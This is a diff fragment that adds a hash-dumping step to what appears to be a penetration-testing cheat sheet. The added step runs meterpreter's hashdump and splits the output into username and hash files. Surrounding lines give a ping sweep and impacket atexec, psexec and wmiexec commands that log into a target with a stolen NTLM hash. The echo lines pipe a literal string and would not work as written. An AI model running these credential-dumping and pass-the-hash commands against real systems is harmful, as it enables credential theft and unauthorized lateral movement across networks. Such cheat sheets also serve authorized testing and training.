@@ -622,6 +622,11 @@ arp -a
 for /L %i in (1,1,254) do ping -n 1 192.168.1.%i
 
 [*] Pass The Hash
+meterpreter> hashdump
+
+echo 'hashdump' | cut -d ':' -f 1 > usernames
+echo 'hashdump' | cut -d ':' -f 3- | sed 's/::.*//' > hashes
+
 impacket-atexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
 impacket-psexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
 impacket-wmiexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
